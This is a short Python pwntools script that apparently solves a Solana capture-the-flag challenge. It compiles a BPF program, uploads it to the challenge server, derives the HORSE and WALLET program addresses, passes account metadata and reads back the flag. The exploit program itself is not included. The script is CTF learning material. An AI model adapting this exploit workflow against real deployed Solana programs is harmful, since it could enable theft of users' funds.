import os
os.system('cargo build-bpf')

from pwn import args, remote
from solana.publickey import PublicKey
from solana.system_program import SYS_PROGRAM_ID

host = args.HOST or 'localhost'
port = args.PORT or 31365

r = remote(host, port)
solve = open('target/deploy/moar_horse_solve.so', 'rb').read()
r.recvuntil(b'program len: ')
r.sendline(str(len(solve)).encode())
r.send(solve)

r.recvuntil(b'program: ')
program = PublicKey(r.recvline().strip().decode())
r.recvuntil(b'user: ')
user = PublicKey(r.recvline().strip().decode())
horse, horse_bump = PublicKey.find_program_address([b'HORSE'], program)
wallet, wallet_bump = PublicKey.find_program_address([b'WALLET', bytes(user)], program)

r.sendline(b'5')
r.sendline(b'x ' + program.to_base58())
r.sendline(b'ws ' + user.to_base58())
r.sendline(b'w ' + horse.to_base58())
r.sendline(b'w ' + wallet.to_base58())
r.sendline(b'x ' + SYS_PROGRAM_ID.to_base58())

r.sendline(b'0')

r.recvuntil(b'Flag: ')
r.stream()
